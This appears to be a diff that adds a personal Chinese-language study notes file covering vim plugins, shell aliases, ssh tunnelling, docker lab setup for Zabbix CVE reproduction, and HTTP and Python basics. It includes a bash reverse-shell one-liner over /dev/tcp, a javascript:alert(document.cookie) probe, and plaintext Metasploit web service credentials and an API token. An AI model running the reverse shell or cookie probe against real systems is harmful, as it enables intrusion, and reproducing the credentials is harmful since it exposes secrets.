@@ -1,0 +1,115 @@
+alias起别名
+采纳ctrl+f、方向右键;采纳一点alt+方向右键
+
+function ll
+    ls -l $argv
+end
+
+function ls
+    command ls -l $argv
+end
+
+fish shell
+tagbar大纲F2
+nerdtree目录树ctrl+j/q
+yapf(python)/clangformat代码格式化(ctrl+k)
+    clang-format -style=可选格式名 -dump-config > .clang-format
+    clang-format -style=file -i main.c直接修改文件
+cscope代码跳转
+    cscope -Rbkq
+    cs find c function
+multiple-cursors代码对齐 (Ctrl+n多重选取 和 Ctrl+p)
+    ctrl+m 选中一个
+    ctrl+p 放弃一个, 回到上一个
+    ctrl+x 跳过当前选中, 选中下一个
+    esc    退出
+    选中后, 可以进行增删替换a/c/x
+vimium谷歌插件
+vimwiki vim插件
+正向移动到下一单词的开头：w，反向移动到当前单词 / 上一单词的开头：b
+strace
+Ctrl+r恢复上一步被撤销的操作
+#undef取消宏定义
+
+正向连接:ssh user@ip
+bash -i >& /dev/tcp/ip/port 0>&1
+bash -i	产生一个bash交互环境
+0>&1	将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容
+
+ssh加密通信：端口转发、ssh隧道
+
+ssh -L a:b-host:b tunnel-host(user@ip) -N
+ssh -p port virtual_user@localhost
+-L本地转发、-R参数表示远程端口转发、-N表示这个 SSH 连接只进行端口转发，不登录远程 Shell，不能执行远程命令，只能充当隧道
+-g允许远程主机连接到本地转发端口
+#curl 是用于在本地计算机与远程服务器之间传输数据的命令行工具
+
+1、
+B-C内网
+A-B外网
+A本地转发C：ssh -L A-port:C-ip:C-port(22) B-user@B-host
+A请求访问C：ssh -p A-port C-user@A-host
+
+A直接连接C：ssh -p 22 C-user@C-host
+
+2、
+A本地转发到B
+ssh -L A-port:B-host:B-port tunnel-host -N
+
+Zabbix RCE-LD-ZH CVE-2020-11800
+poc工具收集整理:Zabbix RCE-LD-ZH复现及提供poc工具
+trapper是被监控主机主动发送数据给zabbix_server
+
+wget https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/3.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_3.0-2+bionic_all.deb
+netstat -an | grep LIS
+
+sudo service zabbix-server start/stop
+sudo netstat -ntpl | grep zabbix
+
+sudo docker ps 查看容器×
+sudo docker-compose up -d 打开镜像
+sudo docker-compose down 关闭镜像
+sudo docker exec -it ID /bin/bash 进入镜像
+
+sudo docker pull vulfocus/zabbix-cve_2017_2824:latest 拉取镜像
+sudo docker pull 下来默认存在 /var/lib/docker/文件夹下
+sudo docker images查看本地镜像
+sudo docker run -d -P vulfocus/zabbix-cve_2017_2824 运行漏洞环境
+一个镜像的运行实例就是一个容器
+
+查看cookie
+javascript:alert(document.cookie)
+
+script
+
+
+if __name__ == "__main__":从这执行
+sys.argv[1:]就会接收输入的参数，并且以空格来进行区分
+pass 是空语句
+
+
+data : 元组列表，字节或要发送到指定URL的文件对象
+auth : 用于启用某种HTTP身份验证的元组
+headers : 要发送到指定网址的HTTP标头字典
+referrer:表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。
+
+CSRF（Cross-site request forgery）跨站请求伪造
+
+
+head -c n显示文件前 n 个字节
+tail -c n显示文件后 n 个字节
+
+1 > /dev/null ： 标准输出重定向到空设备文件，不显示任何信息
+sed 's/要被取代的字串/新的字串/g'
+
+win+shift+q
+
+random.randint(参数1，参数2)随机数
+
+MSF web service username: 123456
+MSF web service password: aYSpp1ORMYMwyQy6I4nFEAaN82CNRS9L3rlQAQjs7fw=
+MSF web service user API token: 82edcdc8095e6b5c6aac3d3c008aba7e5630392765c0115d1b6d50110af0b5eec5019b4b82ae24a8
+
+
+GET方法请求一个指定资源的表示形式，使用GET的请求应该只被用于获取数据
+POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用
